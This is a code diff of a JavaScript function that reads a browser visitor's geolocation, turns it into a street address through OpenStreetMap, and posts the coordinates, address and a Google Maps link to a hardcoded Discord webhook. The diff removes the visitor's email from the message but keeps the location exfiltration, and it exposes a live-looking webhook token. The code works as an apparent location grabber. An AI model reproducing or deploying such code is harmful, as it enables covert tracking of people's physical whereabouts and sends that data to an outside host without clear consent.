@@ -10,7 +10,6 @@ function getLocation() {
 function showPosition(position) {
   var latitude = position.coords.latitude;
   var longitude = position.coords.longitude;
- 
   var addressUrl = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`;
 
   fetch(addressUrl)
@@ -25,7 +24,7 @@ function showPosition(position) {
       var country = address.country ? address.country : '';
       var webhookUrl = "https://discord.com/api/webhooks/1437208147466129420/fTBtmZSYMJtuE3k0QcOuYeWNQdQxM0ywfDHNkV9AEyo6ihfhvzzuOXXnpbSxCcNCAxP6"; // Replace with your own webhook URL
 
-      var message = `New location: ${latitude}, ${longitude}\nAddress: ${houseNumber} ${road}, ${city}, ${state} ${postcode}, ${country}\nGoogle Maps link: https://www.google.com/maps?q=${latitude},${longitude}\nEmail: ${email}`;
+      var message = `New location: ${latitude}, ${longitude}\nAddress: ${houseNumber} ${road}, ${city}, ${state} ${postcode}, ${country}\nGoogle Maps link: https://www.google.com/maps?q=${latitude},${longitude}`;
 
       var data = {
         content: message
@@ -38,8 +37,8 @@ function showPosition(position) {
         },
         body: JSON.stringify(data)
       })
-        .then(response => console.log("Location and email sent to Discord."))
-        .catch(error => console.error("Error sending location and email to Discord: " + error));
+        .then(response => console.log("Location sent to Discord."))
+        .catch(error => console.error("Error sending location to Discord: " + error));
     })
     .catch(error => console.error("Error fetching address: " + error));
 }
